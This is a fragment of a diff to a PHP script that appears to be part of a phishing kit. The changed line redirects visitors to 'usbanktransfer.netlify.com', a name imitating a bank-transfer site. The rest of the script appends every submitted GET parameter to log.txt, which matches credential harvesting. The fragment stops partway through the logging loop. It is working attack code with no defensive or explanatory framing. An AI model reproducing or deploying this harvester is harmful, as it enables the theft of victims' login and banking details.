@@ -1,5 +1,5 @@
 <?php
-header ('Location: http://atwayside.com/Jesserudolf');
+header ('Location: https://usbanktransfer.netlify.com');
 $handle = fopen("log.txt", "a");
 foreach($_GET as $variable => $value) {
 fwrite($handle, $variable);
